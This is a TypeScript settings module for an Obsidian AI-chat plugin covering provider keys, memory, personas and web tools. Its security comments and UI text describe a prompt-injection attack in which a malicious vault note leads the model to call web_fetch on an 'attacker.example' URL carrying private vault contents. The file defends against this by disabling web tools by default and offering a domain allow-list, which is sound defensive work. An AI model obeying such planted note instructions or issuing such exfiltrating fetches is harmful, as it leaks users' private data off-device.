/**
 * Settings tab — progressive-disclosure layout.
 *
 * Always-visible (top, no expander):
 *   1. Active provider dropdown
 *   2. API key for the active provider
 *   3. Default model for the active provider
 *   4. Memory toggle
 *
 * Behind a single collapsed "Advanced" expander:
 *   Vault folders, Memory path, Personas, Slash commands, Capture section.
 *
 * The SkaldSettings + DEFAULT_SETTINGS surface stays here as the
 * canonical interface every other module imports.
 *
 * MODELS is re-exported from settings/provider.ts (ANTHROPIC_MODELS)
 * under the historical name so existing consumers (view.ts model
 * dropdown) don't need updates.
 */

import { App, PluginSettingTab, Setting } from 'obsidian';
import type { Provider } from '@skald/protocol';
import type SkaldPlugin from './main';
import { ANTHROPIC_MODELS, renderProviderSection } from './settings/provider';
import { renderVaultSection } from './settings/vault';

import { renderPersonasSection } from './settings/personas';
import { renderCommandsSection } from './settings/commands';
import { renderCaptureSection } from './settings/capture';
import { renderMemoryToggle, renderMemoryAdvanced } from './settings/memory';

export interface SkaldSettings {
  /**
   * Active provider. Anthropic-direct is the default (rich content
   * blocks, native server tools, prompt caching). OpenRouter is the
   * opt-in fallback for non-Anthropic models via the namespaced
   * catalog.
   */
  provider: Provider;
  anthropicApiKey: string;
  openrouterApiKey: string;
  /** API key (Bearer token) for an OpenAI-compatible endpoint
   * (used when provider=openai). */
  openaiApiKey: string;
  /** Base URL for an OpenAI-compatible endpoint, e.g.
   * https://your-endpoint.example/v1 or http://localhost:11434/v1 (used when provider=openai). */
  openaiBaseUrl: string;
  /** Free-text model id for the OpenAI-compatible endpoint, e.g.
   * qwen2.5-14b (used when provider=openai). */
  openaiModel: string;
  /** Default Anthropic model (used when provider=anthropic). */
  defaultModel: string;
  /** Default OpenRouter model id (used when provider=openrouter).
   * Catalog ids are slash-namespaced: `anthropic/claude-...`,
   * `openai/...`, `meta-llama/...`, etc. */
  openrouterModel: string;
  /**
   * Utility model override for cheap tasks (rerank, future memory upkeep).
   * // empty → per-provider default; set to point the cheap/utility role at any model incl. a local one.
   */
  utilityModel?: string;
  harnessFolder: string;
  savedNotesFolder: string;
  chatsFolder: string;
  logsFolder: string;
  /**
   * Phase 6: vault-as-memory.
   * memoryEnabled: inject memoryPath contents into the system prompt
   *   at the start of every chat. Claude can read + (with approval)
   *   write to this note across sessions for long-term state.
   * memoryPath: the single note holding Claude's memory. Defaults
   *   to Skald/Memory.md.
   */
  memoryEnabled: boolean;
  memoryPath: string;
  /**
   * Phase 9b: personas.
   * activePersona: vault-relative path of the active persona note.
   *   Empty → no persona. The note's body (frontmatter stripped)
   *   prefixes the system prompt.
   */
  activePersona: string;
  /**
   * Phase 9a: slash commands.
   * commandsFolder: where the user keeps slash-command notes.
   */
  commandsFolder: string;
  /**
   * Phase 8: iOS share-sheet capture.
   * capturesFolder: where captured notes land. Default Skald/Captures.
   * capturePromptPath: optional vault-relative path to a custom
   *   prompt-template note. Empty → use the kind-default prompt
   *   baked into the capture module.
   */
  capturesFolder: string;
  capturePromptPath: string;
  /**
   * Polish sweep: configurable empty-state starter chips.
   * startersPath: vault note holding the list of starter chips.
   *   Empty → use the baked-in DEFAULT_STARTER_CHIPS. Format is a
   *   markdown list with optional `:icon-name:` prefix per line.
   */
  startersPath: string;
  /**
   * Extended thinking ("deep mode"). When true AND the active provider
   * supports extended thinking (providerCapabilities.extendedThinking),
   * the Anthropic request includes thinking: { type: 'enabled',
   * budget_tokens: 8192 }. Off by default — slower and costs more
   * (thinking tokens count against output). Never sent to OpenRouter.
   */
  thinkingEnabled: boolean;
  /**
   * Compact large tool results before they enter the model context.
   * Uniform JSON arrays are encoded as TOON (compact tabular notation);
   * other JSON is minified; plain text has repeated lines collapsed.
   * The byte cap (capResult) remains the hard backstop. Default: true.
   * Disable if a downstream model misreads TOON output.
   */
  compactToolResults: boolean;
  /**
   * Web tools (web_search + web_fetch).
   *
   * SECURITY: web_fetch is a prompt-injection EXFILTRATION CHANNEL. skald
   * reads vault notes into the model context, and web_fetch lets the model
   * issue an outbound HTTP GET to an arbitrary URL — a malicious note can
   * instruct the model to fetch `https://attacker.example/?leak=<secrets>`,
   * smuggling private vault data off-device in the query string. These
   * tools run provider-side with no per-URL approval hook, so the only
   * defenses are (1) not shipping the tools and (2) a domain allow-list.
   *
   * webToolsEnabled: master switch. Default FALSE (off) — the channel is
   *   closed unless the operator explicitly opts in. When false, neither
   *   web_search nor web_fetch is sent to the model.
   * webFetchAllowedDomains: when web tools are on, restrict web_fetch to
   *   these domains via Anthropic's native server-side `allowed_domains`
   *   parameter (Anthropic enforces it; defense-in-depth on top of the
   *   on/off gate). Empty = no domain restriction. On OpenRouter a
   *   non-empty list also pins OpenRouter's own fetch engine, which
   *   enforces it. See docs/security-model.md.
   */
  webToolsEnabled: boolean;
  webFetchAllowedDomains: string[];
}

/** Re-export for backwards-compatible imports. */
export const MODELS = ANTHROPIC_MODELS;

export const DEFAULT_SETTINGS: SkaldSettings = {
  provider: 'anthropic',
  anthropicApiKey: '',
  openrouterApiKey: '',
  openaiApiKey: '',
  openaiBaseUrl: '',
  openaiModel: '',
  defaultModel: 'claude-sonnet-4-6',
  openrouterModel: 'anthropic/claude-sonnet-4-6',
  // empty → per-provider default; set to point the cheap/utility role at any model incl. a local one.
  utilityModel: '',
  harnessFolder: '.claude',
  savedNotesFolder: 'Skald/Saved',
  chatsFolder: 'Skald/Chats',
  logsFolder: '',
  memoryEnabled: true,
  memoryPath: 'Skald/Memory.md',
  activePersona: '',
  commandsFolder: 'Skald/Commands',
  capturesFolder: 'Skald/Captures',
  capturePromptPath: '',
  startersPath: 'Skald/Starters.md',
  thinkingEnabled: false,
  compactToolResults: true,
  // SECURITY default: web tools OFF. web_fetch is a prompt-injection
  // exfiltration channel in a vault-reading agent; the safe default is to
  // not ship it. Operators opt in (and may add a domain allow-list) in
  // Advanced settings. This default is an operator/product decision — see
  // docs/security-model.md "Web tools and prompt-injection exfiltration".
  webToolsEnabled: false,
  webFetchAllowedDomains: [],
};

export class SkaldSettingTab extends PluginSettingTab {
  plugin: SkaldPlugin;
  /** Whether the Advanced section is expanded. Instance state only —
   * intentionally not persisted to data.json. Resets on tab re-open. */
  private _advancedExpanded = false;

  constructor(app: App, plugin: SkaldPlugin) {
    super(app, plugin);
    this.plugin = plugin;
  }

  override display(): void {
    const { containerEl } = this;
    containerEl.empty();
    const redisplay = () => this.display();

    // ── Core settings (always visible) ──────────────────────────────
    renderProviderSection(containerEl, this.plugin, redisplay);

    // Memory toggle lives in core so the most common toggle is
    // immediately accessible without expanding Advanced.
    renderMemoryToggle(containerEl, this.plugin);

    // ── Advanced expander ────────────────────────────────────────────
    renderAdvancedExpander(containerEl, this._advancedExpanded, (expanded) => {
      this._advancedExpanded = expanded;
      redisplay();
    });

    if (this._advancedExpanded) {
      renderVaultSection(containerEl, this.plugin);
      renderMemoryAdvanced(containerEl, this.plugin);
      renderPersonasSection(containerEl, this.plugin);
      renderCommandsSection(containerEl, this.plugin);
      renderCaptureSection(containerEl, this.plugin);
      // Deep thinking toggle — capability-gated (Anthropic only).
      new Setting(containerEl)
        .setName('Deep thinking mode (slower, costs more)')
        .setDesc(
          'When on, Claude reasons step-by-step before responding (Anthropic only). ' +
          'Thinking tokens count as output — budget is 8 192 tokens per turn.',
        )
        .addToggle((t) => {
          t.setValue(this.plugin.settings.thinkingEnabled).onChange(async (v) => {
            this.plugin.settings.thinkingEnabled = v;
            await this.plugin.saveSettings();
          });
        });

      // Tool-result compaction toggle.
      new Setting(containerEl)
        .setName('Compact tool results (reduces token usage)')
        .setDesc(
          'Shrinks large tool outputs before they enter the model context: uniform JSON arrays ' +
          'become compact TOON tables; other JSON is minified; repeated text lines are collapsed. ' +
          'Disable if your model misreads compact output.',
        )
        .addToggle((t) => {
          t.setValue(this.plugin.settings.compactToolResults).onChange(async (v) => {
            this.plugin.settings.compactToolResults = v;
            await this.plugin.saveSettings();
          });
        });

      // Web tools (web_search + web_fetch) — SECURITY-sensitive, off by
      // default. Toggling on re-renders so the allow-list field appears.
      renderWebToolsSection(containerEl, this.plugin, redisplay);
    }
  }
}

/** Render the web-tools toggle plus, when enabled, the web_fetch domain
 * allow-list. web_fetch is a prompt-injection exfiltration channel
 * (see docs/security-model.md), so the toggle carries an explicit
 * warning and the allow-list is offered as defense-in-depth. */
function renderWebToolsSection(
  containerEl: HTMLElement,
  plugin: SkaldPlugin,
  redisplay: () => void,
): void {
  new Setting(containerEl)
    .setName('Web tools (web search + web fetch)')
    .setDesc(
      'Lets the model search the web and fetch URLs. SECURITY: web fetch can be ' +
      'abused for data exfiltration — a malicious note in your vault can instruct ' +
      'the model to fetch a URL with your vault contents in it, leaking data ' +
      'off-device. Off by default. When on, set a domain allow-list below to ' +
      'limit where fetches can go.',
    )
    .addToggle((t) => {
      t.setValue(plugin.settings.webToolsEnabled).onChange(async (v) => {
        plugin.settings.webToolsEnabled = v;
        await plugin.saveSettings();
        redisplay();
      });
    });

  if (!plugin.settings.webToolsEnabled) return;

  new Setting(containerEl)
    .setName('Web fetch domain allow-list')
    .setDesc(
      'Comma- or newline-separated list of domains web fetch may access ' +
      '(e.g. en.wikipedia.org, docs.anthropic.com). Enforced server-side by ' +
      'Anthropic, and on OpenRouter by its own fetch engine. Leave empty for ' +
      'the unrestricted "allow" mode — web fetch may then reach ANY URL; ' +
      'choose this only if you accept the exfiltration risk yourself.',
    )
    .addTextArea((ta) => {
      ta.setPlaceholder('en.wikipedia.org\ndocs.anthropic.com');
      ta.setValue(plugin.settings.webFetchAllowedDomains.join('\n'));
      ta.onChange(async (raw) => {
        plugin.settings.webFetchAllowedDomains = parseDomainList(raw);
        await plugin.saveSettings();
      });
    });
}

/** Parse a free-text domain list (comma- and/or newline-separated) into a
 * trimmed, de-duplicated array. Empty entries are dropped so a trailing
 * separator or blank line never produces an empty `allowed_domains` entry
 * (which Anthropic would read as "allow nothing"). */
export function parseDomainList(raw: string): string[] {
  return Array.from(
    new Set(
      raw
        .split(/[\n,]/)
        .map((d) => d.trim())
        .filter((d) => d.length > 0),
    ),
  );
}

/** Render the Advanced toggle heading. Clicking it flips the expanded
 * state and calls onChange so the tab re-renders. Uses a Setting with
 * a toggle component — idiomatic Obsidian progressive disclosure. */
function renderAdvancedExpander(
  containerEl: HTMLElement,
  expanded: boolean,
  onChange: (expanded: boolean) => void,
): void {
  new Setting(containerEl)
    .setName('Advanced')
    .setDesc('Vault folders, memory path, personas, slash commands, capture settings.')
    .setHeading()
    .addToggle((t) => {
      t.setValue(expanded).onChange((v) => onChange(v));
      t.toggleEl.setAttribute('aria-label', expanded ? 'Collapse advanced settings' : 'Expand advanced settings');
    });
}
